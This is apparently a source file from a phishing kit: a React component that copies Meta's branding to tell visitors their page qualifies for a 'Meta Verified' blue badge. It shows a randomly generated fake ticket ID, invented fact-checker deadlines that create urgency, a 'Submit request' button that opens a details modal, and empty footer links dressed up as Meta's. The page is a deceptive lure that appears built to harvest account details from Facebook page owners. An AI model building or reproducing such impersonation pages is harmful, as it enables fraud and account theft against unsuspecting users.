'use client'
import AdvancedModal from '#components/modals/AdvancedModal';
import Link from 'next/link';
import React from 'react'

const MainContent = ({ handleOpendInfoModal }: { handleOpendInfoModal: () => void }) => {
    const [isOpendAdvanced, setIsOpendAdvanced] = React.useState(false);
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");
    const currentDate = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })

    const handleOpend = () => {
        handleOpendInfoModal();
    }

    const handleOpendAdvanced = () => {
        setIsOpendAdvanced(true);
    }

    React.useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();

    }, []);

    return (
        <>
            <div className="flex flex-col items-center justify-start bg-[linear-gradient(130deg,rgba(249,241,249,1)_0%,rgba(234,243,253,1)_35%,rgba(237,251,242,1)_100%)] min-h-[100vh] w-full">
                <div className='max-w-[768px] w-full p-[15px] h-full'>
                    <div className="p-[15px]">
                        <div className='flex items-start gap-[8px] flex-col justify-start mb-[30px]'>
                            <img src="images/icons/ic_blue.svg" className='w-[48px] h-[48px]' alt="tick" />
                            <b className='text-[2rem]'>Meta Verified - Rewards for you</b>
                        </div>

                        <div className='w-full'>
                            <div className='w-full mb-[20px]'>
                                <b className='text-[17px]'>Show the world that you mean business.</b>
                                <p className='text-[15px] mb-[0px] mt-[15px]'>Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you’ve built with your audience.</p>
                                <p className='text-[15px] mb-[0px] mt-[15px]'>We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!</p>
                                <p className='text-[16px] mb-[0px] mt-[14px] text-[#465a69]'>Your ticket id: #{ticketId}</p>
                            </div>

                            <div className='w-full'>
                                <p className='mb-[15px]'><b className='text-[17px] font-bold'>Verified Blue Badge Request Guide</b></p>
                                <p className='text-[15px] mb-[10px]'>- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats</p>
                                <p className='text-[15px] mb-[10px]'>- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</p>
                                <p className='text-[15px] mb-[0px]'>- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.</p>
                            </div>
                        </div>
                    </div>
                    <div className='bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center' onClick={handleOpend}>Submit request</div>
                    <div className='flex items-center text-center justify-center flex-wrap text-[12px] mt-[30px] text-[#65676b] gap-[16px]'>
                        <Link href="">Help Center</Link>
                        <Link href="">Privacy Policy</Link>
                        <Link href="">Terms of Service</Link>
                        <Link href="">Community Standards</Link>
                        <Link href="">Meta © {new Date().getFullYear()}</Link>
                    </div>
                </div>
            </div>
        </>
    )
}

export default MainContent
